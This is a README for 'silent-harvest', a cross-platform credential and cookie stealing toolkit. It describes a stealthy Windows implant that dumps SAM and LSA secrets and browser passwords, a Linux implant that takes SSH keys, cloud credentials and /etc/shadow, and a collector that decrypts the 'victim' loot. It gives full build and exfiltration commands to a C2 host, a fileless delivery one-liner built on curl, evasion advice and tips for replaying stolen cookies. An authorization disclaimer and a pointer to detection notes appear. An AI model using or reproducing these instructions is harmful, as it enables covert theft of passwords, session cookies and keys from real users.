# silent-harvest

Cross-platform credential & cookie harvesting toolkit: a stealthy Windows
implant, a dependency-free Linux implant, and an operator-side collector that
receives, decrypts, and parses everything into usable credentials.

The Windows implant implements the **"Silent Harvest" registry technique** —
`SeBackupPrivilege` + `NtOpenKeyEx(REG_OPTION_BACKUP_RESTORE)` + bulk
`RegQueryMultipleValuesW` — for SAM/LSA material without touching the APIs
EDR hooks, duplicates live browser file handles to read locked cookie
databases, and exfiltrates a single AES-256-GCM encrypted blob to your
collector. Intended for use against systems you are authorized to test.

```
implant (target)                                operator
┌───────────────────────────────────┐           ┌─────────────────────────────────┐
│ 1. arm SeBackupPrivilege          │           │ python collector.py :8443       │
│ 2. NtOpenKeyEx backup-restore     │  HTTPS/   │   POST /gate  ← SHV1 container  │
│    + RegQueryMultipleValuesW      │  HTTP     │ python parse_loot.py            │
│    SAM · LSA secrets · bootkey    │ ────────► │   ├ report.txt   summary        │
│ 3. esentutl /y /vss hive copies   │  AEAD    │   ├ creds.json   machine-read.  │
│ 4. browsers: DPAPI keys,          │  only    │   ├ cookies_*.txt (Netscape)    │
│    Cookies/LoginData/WebData,     │          │   ├ hives/  → secretsdump       │
│    handle-dup of locked DBs       │          │   └ linux: ssh/aws/shadow/…     │
│ 5. linux: keys, keyring, history  │          │                                 │
└───────────────────────────────────┘           └─────────────────────────────────┘
```

---

## Repository layout

| path | contents |
|---|---|
| `implant/` | Windows implant — C# 5, compiles with the **in-box** `csc.exe` (no SDK/toolchain needed) |
| `linux/sh_harvest.py` | Linux implant — single-file Python 3, stdlib only |
| `server/collector.py` | threaded loot receiver + encrypted store |
| `server/parse_loot.py` | bundle → report/creds/cookie files, hive dump hookup |
| `server/shcrypto.py` | container format reference implementation (Python) |
| `build.bat` | Windows implant build (bakes C2 + PSK) |
| `test/` | synthetic round-trip tests + debug probes |
| `docs/TECHNIQUES.md` | technique details, ATT&CK map, detection guidance |

## Requirements

**Operator:** Python 3.8+ with `cryptography` (`pip install cryptography`).
`impacket` is optional — when installed, hive bundles are cracked to
NT hashes / DCC2 / LSA secrets automatically (`pip install impacket`).

**Windows target:** nothing. The implant builds to a self-contained .NET
Framework 4.x binary (present on every Windows 8+ install) and runs
unelevated or elevated.

**Linux target:** Python 3. AES-GCM uses `cryptography` when importable,
falls back to ctypes → libcrypto (OpenSSL — present everywhere).

---

## Building the Windows implant

```bat
cd silent-harvest
build.bat /name updater.exe /c2 http://YOUR.HOST:8443/gate /psk LONGRANDOMSECRET
```

| arg | default | meaning |
|---|---|---|
| `/name` | `appsetup.exe` | release binary name |
| `/c2`   | `http://127.0.0.1:8443/gate` | collector endpoint baked into the binary |
| `/psk`  | `dev-psk-change-me` | pre-shared key; also written to `server/psk.txt` for the collector |
| `/release-only` | — | skip the debug build |

Outputs:

| file | type | use |
|---|---|---|
| `build/sh_debug.exe` | console | testing — logs every stage to stdout |
| `build/<name>` | GUI (`winexe`) | payload — no console, no output, runs and exits |

The PSK must match between build and collector — that is the only thing that
lets the collector decrypt bundles. Never ship `build/` or `server/psk.txt`.

## Linux implant

No build step. Configure per run (args or env), or bake defaults by editing
the `CFG` dict at the top of the file.

```bash
# self-check (crypto + container roundtrip)
python3 sh_harvest.py --selftest

# harvest + exfil
python3 sh_harvest.py --c2 http://YOUR.HOST:8443/gate --psk LONGRANDOMSECRET

# or via environment
SH_C2=http://YOUR.HOST:8443/gate SH_PSK=LONGRANDOMSECRET python3 sh_harvest.py
```

Delivery notes: a plaintext `.py` on disk is more audible than the Windows
release exe. If that matters, deliver memory-backed
(`python3 -c "$(curl -s …)"`), wrap in a launcher, or freeze to a standalone
ELF with PyInstaller on your build box.

---

## Running

### 1. Start the collector

```bash
cd server
python collector.py --port 8443 --bind 0.0.0.0 [--psk SECRET] [--loot-dir ../loot]
```

PSK resolution order: `--psk` arg → `SH_PSK` env → `psk.txt` (written by
`build.bat`) → built-in dev key. Endpoints: `POST /gate` (bundles),
`GET /health` (liveness). Bundles failing AEAD auth (wrong PSK) are rejected
and logged, never stored.

### 2. Run a payload

**Windows** (`sh_debug.exe` shown; the release build takes the same flags):

```
sh_debug.exe                                  # baked C2, all stages
sh_debug.exe --c2 http://1.2.3.4:8443/gate    # override endpoint
sh_debug.exe --only brow                      # stage filter: reg,hive,brow
sh_debug.exe --out loot.bin                   # offline: container to disk, no network
sh_debug.exe --psk OTHERKEY --wait 2000       # PSK override, 2s jitter
```

**Linux** (`sh_harvest.py`) — same flags, plus `--home DIR` (treat DIR as the
target's home — useful for lab tests) and `-v` for stage logging.
Stage filter values: `brow`, `keys`, `keyring`.

Exit codes (both implants): `0` success · `1` nothing collected · `2` C2
unreachable (container dead-dropped to `%TEMP%\sh_*.bin` / `/tmp/.sh_*.bin`
for later retrieval) · `3` crypto failure (Windows).

### 3. Parse the loot

```bash
python parse_loot.py                 # newest bundle under loot/
python parse_loot.py <bundle_dir>    # specific bundle
python parse_loot.py --bundle f.bin  # standalone container file
```

Each run writes into the bundle directory:

| file | contents |
|---|---|
| `report.txt` | human-readable summary of every stage |
| `creds.json` | everything machine-readable (below) |
| `cookies_<browser>_<profile>.txt` | Netscape-format cookies — importable into curl, Burp, cookie editors |
| `hives/*.hive` | raw SAM/SECURITY/SYSTEM (when elevated) + `secretsdump.txt` if impacket is installed |
| `parts/` | every exfiltrated artifact, named after the manifest part |

`creds.json` top-level keys: `victim`, `cookies[]` (host/name/value/expires/
secure/decrypted/appbound), `passwords[]` (url/user/password/browser),
`cards[]`, `autofill[]`, `registry{}` (raw value hex per key path), `bootkey`
(descrambled syskey, when components present), `secretsdump` (impacket
output), `shadow{}` (linux), `keyfiles[]`/`private_keys[]` (ssh/gpg),
`cloud[]` (aws/git-creds/netrc/docker), `wifi[]` (NetworkManager psk),
`history[]` (shell history tails).

### Loot store layout

```
loot/
├── index.jsonl                     # one line per bundle (host, user, parts)
└── <HOST>-<USER>-<UNIXTS>/         # one directory per received bundle
    ├── bundle.bin                  # encrypted container, as received
    ├── manifest.json               # victim info + part list (post-decrypt)
    ├── report.txt / creds.json     # written by parse_loot.py
    └── parts/… / hives/…
```

---

## What gets collected

| stage | Windows (unelevated) | Windows (elevated) | Linux (user) | Linux (root) |
|---|---|---|---|---|
| registry technique | bootkey components (JD/Skew1/GBG/Data key classes), OS info | + SAM `F`/`V` per RID, LSA secrets (`Policy\Secrets\*\CurrVal`), cached domain logons (`NL$1..10`) | — | — |
| hives | skipped | SAM/SECURITY/SYSTEM via `esentutl /y /vss` | — | — |
| chromium browsers | Local State, DPAPI-unwrapped AES key, `Network/Cookies`, `Login Data`, `Web Data` (incl. locked DBs via handle duplication) | same (+ VSS fallback) | same paths under `~/.config`, os_crypt password via `secret-tool` (v1+v2 schemas) or `"peanuts"` fallback | same |
| firefox / thunderbird | `key4.db`, `logins.json`/`logins.db`, `cert9.db` per profile | same | same | same |
| keys & cloud | — | — | `~/.ssh`, `~/.gnupg` private keys, `~/.aws`, `~/.netrc`, `~/.git-credentials`, `~/.docker`, `~/.kube`, history tails | + `/etc/shadow`, NetworkManager Wi-Fi psk |
| keyring | — | — | raw `~/.local/share/keyring/*` | same |

Chromium browsers covered: Chrome, Edge, Brave, Chromium, Vivaldi, Opera
(Windows) / Chrome, Chromium, Edge, Brave, Vivaldi, Opera (Linux), all
profiles (`Default`, `Profile *`).

### Manifest part naming

Part names drive the parser; useful when working `parts/` by hand:

| prefix | example | meaning |
|---|---|---|
| `sysinfo.json` | | victim summary |
| `regvals.json` | | registry technique results (values base64 + statuses) |
| `hive:` | `hive:SAM` | raw hive copy |
| `b:` | `b:chrome/Default/Cookies` | chromium browser artifact |
| `b:…/aeskey.bin` / `ABEblob.bin` / `linux_password` | | chromium key material |
| `ff:` | `ff:<profile>/key4.db` | firefox/thunderbird artifact |
| `linux:` | `linux:ssh/id_rsa`, `linux:etc/shadow` | linux stage artifact |

---

## Container format (SHV1)

```
"SHV1" | ver:u16 | salt:16 | nonce:12 | ct_len:u64 | ciphertext | tag:16
```

- key = HKDF-SHA256(ikm=PSK, salt, info=`"silent-harvest/v1"`, 32 bytes)
- AEAD = AES-256-GCM, AAD = first 6 header bytes
- plaintext = `u32 manifest_len` + JSON manifest + concatenated part blobs
  (manifest carries per-part `name/offset/length/meta`)

Only the 6-byte header is visible on the wire. Reference implementations:
`server/shcrypto.py` (Python) and `implant/Crypto.cs` (raw CNG — no .NET
crypto assemblies), byte-identical.

## Capabilities & limitations

| area | status |
|---|---|
| Registry technique (SAM/LSA/bootkey) | implemented; privileged targets require elevation — backup-intent opens are privilege-checked by the kernel, unelevated runs get readable-SYSTEM material and honest `STATUS_ACCESS_DENIED` statuses |
| Hive → NT hashes / DCC2 / LSA secrets | full automation when `impacket` is installed; hives always stored for offline work |
| Chromium **v10** (Windows, pre-app-bound) | decrypted end-to-end (cookies, passwords, cards) |
| Chromium **v10/v11** (Linux/macOS scheme: PBKDF2-SHA1/`saltysalt` → AES-128-CBC) | decrypted end-to-end, both `peanuts` and keyring passwords |
| Chromium **v11/v20** (Windows app-bound, Chrome ≥127 / 2025 v20) | **not decryptable in user mode by design** — DBs + os_crypt key + raw `app_bound_encrypted_key` blob are exfiltrated for offline/SYSTEM-context processing |
| **DBSC** (Chrome ≥145, TPM-bound sessions) | cookies still decrypt, but replay from another device fails at the next DBSC handshake — factor into loot value |
| Firefox classic (`key4.db` a11 + `logins.json`) | decrypted end-to-end |
| Firefox new LoginStore (`logins.db` `loginsL/loginsM`) | `secFields` exfiltrated raw (Rust sync-store format) |
| Locked Chrome Cookies DB (browser running) | read via handle duplication (Windows; no elevation needed) |
| CLR visibility | the Windows implant is .NET — more EDR-visible than native; the code is P/Invoke-first to make a native port mechanical |

Linux equivalents: `/etc/shadow` and NetworkManager profiles need root; a
locked keyring (or missing `secret-tool`) falls back to `"peanuts"` and is
flagged in the report.

## Detection engineering

`docs/TECHNIQUES.md` documents the full defender view — Event 4672
correlation, backup-intent registry opens, `RegQueryMultipleValuesW` on
SAM/SECURITY, esentutl/VSS patterns, handle-table enumeration bursts, the
`SHV1` wire signature, and Linux auditd/D-Bus angles. Useful both for
red-team QA against your own EDR and for building detections.

## Testing

Every decryption chain has a synthetic round-trip test (real crypto, known
values, no live credentials needed):

```bash
cd server && python shcrypto.py           # container + PSK rejection
cd test   && python synth_firefox.py      # key4 ASN.1 / a11 / 3DES
cd test   && python synth_chromium.py     # windows chromium v10 (DPAPI+GCM)
cd test   && python synth_linux.py        # linux implant end-to-end over a synthetic home
```

## Operational notes

- **PSK discipline:** one PSK per operation; it is the only thing protecting
  bundles in transit and at rest on the collector.
- **TLS:** the collector speaks plain HTTP by default; front it with a TLS
  reverse proxy, or point `--c2` at an `https://` URL — the implant accepts
  self-signed certs when `AcceptAnyCert` is true. The AEAD layer is
  independent of transport security.
- **Failure behavior:** unreachable C2 → dead-drop in temp, exit code 2;
  partial privilege → stages degrade individually and report status; wrong
  PSK → collector rejects without storing.
- **Rebuild after moving:** `build.bat` writes `implant/Config.cs` and
  `server/psk.txt` relative to the repo root — always run it from there.

## License

Provided as-is for authorized security testing and research. No warranty.
